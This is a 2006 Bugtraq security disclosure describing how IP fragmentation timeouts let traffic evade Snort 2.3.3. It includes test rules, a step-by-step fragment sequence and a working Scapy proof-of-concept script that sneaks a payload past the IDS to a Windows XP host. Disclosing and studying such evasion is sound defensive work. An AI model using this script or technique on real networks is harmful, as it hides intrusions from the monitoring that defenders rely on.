@@ -1,0 +1,157 @@
+
+Date: 26 Jan 2006 20:51:32 -0000
+From: a@...urityfocus.com, non@...urityfocus.com,
+	poet@...urityfocus.com, in@...urityfocus.com (at),
+	connu@...urityfocus.com, dot_@...urityfocus.com,
+	isu@...urityfocus.com, d_ot@...urityfocus.com, edu@...urityfocus.com
+To: bugtraq@...urityfocus.com
+Subject: Verified evasion in Snort
+
+
+<pre>
+Dan Kaminsky gave a presentation at shmoocon and mentioned using 
+ip fragmentation timers to evade intrusion detection systems. It's 
+a pretty straightforward technique and easy to code up so we 
+decided to look and see if Snort was vulnerable.
+
+------------------------------------------------------------------
+
+We added a couple of rules
+
+alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"Found Generic ICMP Packet"; icode:0; itype:8; classtype:misc-activity; sid:384; rev:5;)
+alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"Found BadStuff"; content:"BADSTUFF";icode:0; itype:8; classtype:misc-activity; sid:384; rev:5;)
+
+to a snort 2.3.3 config file (gentoo emerge).
+
+We crafted up a quick ping with the string "BADSTUFF" to test our configuration.
+Sure enough, snort alerted on the packet.  Next we tested that snort was
+properly assembly fragments.  We fragmented the icmp echo request into two
+packets and threw them at the target host.  Snort properly reassembled them
+in either order and the target returned an echo reply send to a Windows XP
+host.
+
+Now for the attack.  We crafted 3 fragments.  The first contained a standard
+icmp ping header.  The second contained the BADSTUFF string and the third 
+contained an alternate GODSTUFF string.
+
+Step 1)
+
+Send over the GODSTUFF packet.  The GODSTUFF fragment is recieved by Snort 
+and the Windows XP machine.
+
+                 Snort         WindowsXP
+--->GODSTUFF     GODSTUFF      GODSTUFF
+
+
+Step 2)
+
+Wait 5 seconds for the fragment to timeout on the XP Host. The frament is
+still in the reassembly buffer for Snort.
+
+                 Snort         WindowsXP
+(Wait 5sec)     GODSTUFF      
+
+
+Step 3)
+
+Send over the common ICMP Header.  It is recieved by both Snort and the 
+WindowsXP host.
+
+                 Snort         WindowsXP
+                 GODSTUFF      
+--->Header       Header        Header
+
+
+
+Snort now has both pieces it needs for reassembly and reconstructs the framents
+into a broken ICMP packet and discards both fragments. The WindowsXP host
+now only had the header fragment in the reassembly buffer. (Note: we could have
+made the icmp checksum work out, but we didn't have to.)
+
+                 Snort         WindowsXP      
+--->Header                     Header
+
+
+
+Step 4)
+
+Send over the BADSTUFF packet.
+
+                 Snort         WindowsXP
+                               Header
+--->BADSTUFF     BADSTUFF      BADSTUFF
+
+
+The WindowsXP host properly reassembles the icmp packet and sends us back
+an icmp echo reply with the BADSTUFF string in it.  No alerts from snort.
+Eventually the BADSTUFF fragment will silently timeout in Snort's buffer.
+
+
+-------------
+
+This technique could be used to bypass most Snort signatures.  It'd be fun
+to add a snort-inline plugin to do it automatically when pen-testing.  If
+Snort cleared the fragments in the reassembly buffer on and icmp fragmentation
+reassembly time exceeded message, the attack would be hard to pull off.  
+Unfortunately, many stacks and hardened systems no longer send out those
+messages.
+
+Jason Larsen
+Mike Milivich
+
+attached is a proof-of-concept in scapy
+
+
+#!/usr/bin/python
+
+from scapy import *
+from time import sleep
+from random import seed
+from random import randint
+
+# seed the random number generating using the current time
+seed(None)
+
+# victim
+ip = IP(dst="10.4.4.4")
+# generate a random ID, all of the fragments have to have the
+# same ID, but we want to use something that the IDS/target isn't
+# already trying to reassemble
+ip.id = randint(0x1000,0x5000)
+ip.proto = 0x1 # ICMP protocol number
+
+# get just the data part, not the ip header 
+data1 = str(ip/ICMP(id=0x8236, seq=83)/("BADSTUFF"))[len(ip):]
+data2 = str(ip/ICMP(id=0x8236, seq=83)/("GODSTUFF"))[len(ip):]
+
+# split into fragments
+splitLoc = 8
+frag1 = data1[:splitLoc]
+frag2 = data1[splitLoc:]
+frag2Good = data2[splitLoc:]
+
+# send the fragments
+
+# send the "good" fragment
+ip.flags = 0
+ip.frag = splitLoc / 8
+send(ip/frag2Good)
+
+# wait for good fragment to timeout on the target, this will change
+# depending on the target... 5 seconds worked against a test windows box
+sleep(5)
+
+# send the first fragment which causes the IDS to reassemble
+ip.flags = 1
+ip.frag = 0
+send(ip/frag1)
+
+# send the bad fragment to reassemble on the target, sits in the IDS
+# until the IDS flush's it from the fragment cache
+ip.flags = 0
+ip.frag = splitLoc / 8
+send(ip/frag2)
+
+</pre>
+
+
